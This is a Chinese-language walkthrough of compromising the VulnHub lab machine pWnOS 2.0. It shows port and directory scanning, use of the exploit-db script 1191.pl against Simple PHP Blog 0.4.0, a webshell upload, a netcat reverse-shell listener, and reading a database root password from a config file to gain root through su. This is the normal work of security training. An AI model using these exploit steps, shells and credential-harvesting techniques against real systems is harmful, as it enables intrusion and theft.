# pWnOS：2.0 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/pwnos-20-pre-release,34/
-   下载地址：https://download.vulnhub.com/pwnos/pWnOS_v2.0.7z

## 信息收集

### 主机发现

```shell
└─$ sudo nmap -sn 10.10.10.1/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 14:36 HKT
Nmap scan report for 10.10.10.1
Host is up (0.00026s latency).
MAC Address: AA:A1:59:52:23:66 (Unknown)
Nmap scan report for 10.10.10.2
Host is up (0.00025s latency).
MAC Address: 00:50:56:E0:DE:AC (VMware)
Nmap scan report for 10.10.10.100
Host is up (0.00026s latency).
MAC Address: 00:0C:29:34:B6:A8 (VMware)
Nmap scan report for 10.10.10.254
Host is up (0.00029s latency).
MAC Address: 00:50:56:F7:B3:A3 (VMware)
Nmap scan report for 10.10.10.129
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.06 seconds

```



### 端口发现

```shell
# 扫描TCP端口
└─$ nmap -sT --min-rate 10000 -p- 10.10.10.100 -oA Nmap-scan/sT
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 14:39 HKT
Nmap scan report for 10.10.10.100
Host is up (0.00090s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.62 seconds

# 扫描UDP端口
└─$ sudo nmap -sU --min-rate 10000 -p- 10.10.10.100 -oA Nmap-scan/sU
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 14:40 HKT
Warning: 10.10.10.100 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.100
Host is up (0.00072s latency).
All 65535 scanned ports on 10.10.10.100 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 00:0C:29:34:B6:A8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.84 seconds

```



### 服务扫描

```shell
└─$ sudo nmap -sC -sV -O -p22,80 --min-rate 10000 10.10.10.100 -oA Nmap-scan/sC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 14:42 HKT
Nmap scan report for 10.10.10.100
Host is up (0.00037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85d32b0109427b204e30036dd18f95ff (DSA)
|   2048 307a319a1bb817e715df89920ecd5828 (RSA)
|_  256 1012644b7dff6a87372638b1449fcf5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
|_http-title: Welcome to this Site!
|_http-server-header: Apache/2.2.17 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 00:0C:29:34:B6:A8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32 - 2.6.39
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.17 seconds

```



### 默认漏洞脚本扫描

```shell
└─$ sudo nmap --script=vuln -p 22,80 10.10.10.100 -oA Nmap-scan/script                       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 14:43 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.100
Host is up (0.00038s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.100
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.100:80/login.php
|     Form id: 
|     Form action: login.php
|     
|     Path: http://10.10.10.100:80/register.php
|     Form id: 
|_    Form action: register.php
| http-enum: 
|   /blog/: Blog
|   /login.php: Possible admin folder
|   /login/: Login page
|   /info.php: Possible information file
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.2.17 (ubuntu)'
|   /index/: Potentially interesting folder
|   /info/: Potentially interesting folder
|_  /register/: Potentially interesting folder
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       httponly flag not set
|   /login.php: 
|     PHPSESSID: 
|       httponly flag not set
|   /login/: 
|     PHPSESSID: 
|       httponly flag not set
|   /index/: 
|     PHPSESSID: 
|       httponly flag not set
|   /register/: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 00:0C:29:34:B6:A8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 56.08 seconds
```



## web主机发现

-   查看以上的扫描信息发现有`blog,info,includes`等目录，使用扫描器进行二次扫描，以免遗漏信息

-   使用`gobuster`进行扫描

-   ```shell
    └─$ gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.100
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.5
    [+] Timeout:                 10s
    ===============================================================
    2023/05/25 15:06:01 Starting gobuster in directory enumeration mode
    ===============================================================
    /blog                 (Status: 301) [Size: 311] [--> http://10.10.10.100/blog/]
    /login                (Status: 200) [Size: 1174]
    /register             (Status: 200) [Size: 1562]
    /index                (Status: 200) [Size: 854]
    /info                 (Status: 200) [Size: 49873]
    /includes             (Status: 301) [Size: 315] [--> http://10.10.10.100/includes/]
    /activate             (Status: 302) [Size: 0] [--> http://10.10.10.100/index.php]
    /server-status        (Status: 403) [Size: 293]
    Progress: 219611 / 220561 (99.57%)
    ===============================================================
    2023/05/25 15:06:40 Finished
    ===============================================================
    
    # 指定文件类型进行二次扫描
    └─$ gobuster dir -u http://10.10.10.100 -x txt,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.100
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.5
    [+] Extensions:              txt,php
    [+] Timeout:                 10s
    ===============================================================
    2023/05/25 15:08:12 Starting gobuster in directory enumeration mode
    ===============================================================
    /index.php            (Status: 200) [Size: 854]
    /blog                 (Status: 301) [Size: 311] [--> http://10.10.10.100/blog/]
    /index                (Status: 200) [Size: 854]
    /login                (Status: 200) [Size: 1174]
    /login.php            (Status: 200) [Size: 1174]
    /register             (Status: 200) [Size: 1562]
    /register.php         (Status: 200) [Size: 1562]
    /info                 (Status: 200) [Size: 49873]
    /info.php             (Status: 200) [Size: 49885]
    /includes             (Status: 301) [Size: 315] [--> http://10.10.10.100/includes/]
    /activate             (Status: 302) [Size: 0] [--> http://10.10.10.100/index.php]
    /activate.php         (Status: 302) [Size: 0] [--> http://10.10.10.100/index.php]
    /server-status        (Status: 403) [Size: 293]
    Progress: 659023 / 661683 (99.60%)
    ===============================================================
    2023/05/25 15:10:03 Finished
    ===============================================================
    
    ```

-   通过查看页面源代码找到当前使用的cms版本

-   ![image-20230525161254519](https://raw.githubusercontent.com/r0o983/images/main/image-20230525161254519.png)

-   使用`searchsploit`搜索当前cms漏洞脚本并查看

-   ```shell
    └─$ searchsploit blog 0.4.0
    ------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                     |  Path
    ------------------------------------------------------------------- ---------------------------------
    EggBlog < 3.07 - Remote SQL Injection / Privilege Escalation       | php/webapps/1842.html
    Oracle WebLogic < 10.3.6 - 'wls-wsat' Component Deserialisation Re | multiple/remote/43458.py
    Simple PHP Blog 0.4 - 'colors.php' Multiple Cross-Site Scripting V | cgi/webapps/26463.txt
    Simple PHP Blog 0.4 - 'preview_cgi.php' Multiple Cross-Site Script | cgi/webapps/26461.txt
    Simple PHP Blog 0.4 - 'preview_static_cgi.php' Multiple Cross-Site | cgi/webapps/26462.txt
    Simple PHP Blog 0.4.0 - Multiple Remote s                          | php/webapps/1191.pl
    Simple PHP Blog 0.4.0 - Remote Command Execution (Metasploit)      | php/webapps/16883.rb
    ------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results
                                                                                                         
    ┌──(kali㉿kali)-[~]
    └─$ searchsploit blog 0.4.0 -m 1191.pl
    [!] Could not find EDB-ID #
    
    
    [!] Could not find EDB-ID #0
    
    
      Exploit: Simple PHP Blog 0.4.0 - Multiple Remote s
          URL: https://www.exploit-db.com/exploits/1191
         Path: /usr/share/exploitdb/exploits/php/webapps/1191.pl
        Codes: OSVDB-19070, CVE-2005-2787, OSVDB-19012, CVE-2005-2733, OSVDB-17779, CVE-2005-2192
     Verified: True
    File Type: Perl script text executable
    Copied to: /home/kali/1191.pl
    
    ```

-   根据代码提示需要指定三个参数`-h -e -U -P `

-   ![image-20230525161550310](https://raw.githubusercontent.com/r0o983/images/main/image-20230525161550310.png)

-   >   ./1191.pl -h http://10.10.10.100/blog/ -e 3 -U admin -P admin

-   ![image-20230525161753111](https://raw.githubusercontent.com/r0o983/images/main/image-20230525161753111.png)

-   登陆后找到文件上传位置进行尝试上传webshell

-   ![image-20230525161921650](https://raw.githubusercontent.com/r0o983/images/main/image-20230525161921650.png)

-   找到文件上传位置并进行访问

-   ![image-20230525162147266](https://raw.githubusercontent.com/r0o983/images/main/image-20230525162147266.png)

-   在本地监听并等待连接 --> 获得初始shell

-   >   sudo nc -nvlp 1234

-   ```shell
    └─$ sudo nc -nvlp 1234                                                
    [sudo] password for kali: 
    listening on [any] 1234 ...
    connect to [10.10.10.129] from (UNKNOWN) [10.10.10.100] 47940
    bash: no job control in this shell
    www-data@web:/var/www/blog/images$ whoami
    whoami
    www-data
    www-data@web:/var/www/blog/images$ ip a
    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:34:b6:a8 brd ff:ff:ff:ff:ff:ff
        inet 10.10.10.100/24 brd 10.10.10.255 scope global eth0
        inet6 fe80::20c:29ff:fe34:b6a8/64 scope link 
           valid_lft forever preferred_lft forever
    www-data@web:/var/www/blog/images$ 
    ```

-   找到`/var`文件夹下的`mysqli_connect.php`文件进行查看后获得root密码

-   ```shell
    www-data@web:/var$ cat mysqli_connect.php
    cat mysqli_connect.php
    <?php # Script 8.2 - mysqli_connect.php
    
    // This file contains the database access information.
    // This file also establishes a connection to MySQL
    // and selects the database.
    
    // Set the database access information as constants:
    
    DEFINE ('DB_USER', 'root');
    DEFINE ('DB_PASSWORD', 'root@ISIntS');
    DEFINE ('DB_HOST', 'localhost');
    DEFINE ('DB_NAME', 'ch16');
    
    // Make the connection:
    
    $dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
    
    ?>www-data@web:/var$ 
    
    ```

-   尝试使用su进行提权操作

-   ```shell
    ?>www-data@web:/var$ su  
    su
    su: must be run from a terminal
    www-data@web:/var$ python -c 'import pty;pty.spawn("/bin/bash");'
    python -c 'import pty;pty.spawn("/bin/bash");'
    www-data@web:/var$ su
    su
    Password: root@ISIntS
    
    ```

-   获得root权限

-   ```shell
    www-data@web:/var$ python -c 'import pty;pty.spawn("/bin/bash");'
    python -c 'import pty;pty.spawn("/bin/bash");'
    www-data@web:/var$ su
    su
    Password: root@ISIntS
    
    root@web:/var# whoami
    whoami
    root
    root@web:/var# stty raw -echo
    stty raw -echo
    root@web:/var# whoami
    root
    root@web:/var# ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:34:b6:a8 brd ff:ff:ff:ff:ff:ff
        inet 10.10.10.100/24 brd 10.10.10.255 scope global eth0
        inet6 fe80::20c:29ff:fe34:b6a8/64 scope link 
           valid_lft forever preferred_lft forever
    root@web:/var# cd /root 
    root@web:~# ls
    root@web:~# uname -a
    Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
    root@web:~# lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 11.04
    Release:        11.04
    Codename:       natty
    root@web:~# sudo -l
    Matching Defaults entries for root on this host:
        env_reset
    
    User root may run the following commands on this host:
        (ALL : ALL) ALL
    root@web:~# 
    
    ```

